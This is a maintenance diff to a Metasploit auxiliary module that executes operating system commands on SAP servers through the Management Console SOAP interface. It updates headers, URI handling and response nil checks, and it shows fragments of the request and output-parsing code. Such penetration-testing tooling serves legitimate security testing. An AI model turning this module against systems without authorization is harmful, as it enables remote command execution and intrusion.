@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -20,7 +16,6 @@ class Metasploit4 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'         => 'SAP Management Console OSExecute',
-			'Version'      => '$Revision$',
 			'Description'  => %q{
 				This module allows execution of operating system commands through the SAP
 				Management Console SOAP Interface. A valid username and password must be
@@ -76,7 +71,7 @@ class Metasploit4 < Msf::Auxiliary
 
 		begin
 			res = send_request_raw({
-				'uri'     => "/#{datastore['URI']}",
+				'uri'     => normalize_uri(datastore['URI']),
 				'method'  => 'POST',
 				'data'    => data,
 				'headers' =>
@@ -141,7 +136,7 @@ class Metasploit4 < Msf::Auxiliary
 
 		begin
 			res = send_request_raw({
-				'uri'     => "/#{datastore['URI']}",
+				'uri'     => normalize_uri(datastore['URI']),
 				'method'  => 'POST',
 				'data'    => data,
 				'headers' =>
@@ -153,7 +148,7 @@ class Metasploit4 < Msf::Auxiliary
 					}
 			}, 60)
 
-			if res.code == 200
+			if res and res.code == 200
 				success = true
 				body = CGI::unescapeHTML(res.body)
 				if body.match(/<exitcode>(.*)<\/exitcode>/i)
@@ -165,7 +160,7 @@ class Metasploit4 < Msf::Auxiliary
 				if body.match(/<lines>(.*)<\/lines>/i)
 					items = body.scan(/<item>(.*?)<\/item>/i)
 				end
-			elsif res.code == 500
+			elsif res and res.code == 500
 				case res.body
 				when /<faultstring>(.*)<\/faultstring>/i
 					faultcode = "#{$1}"
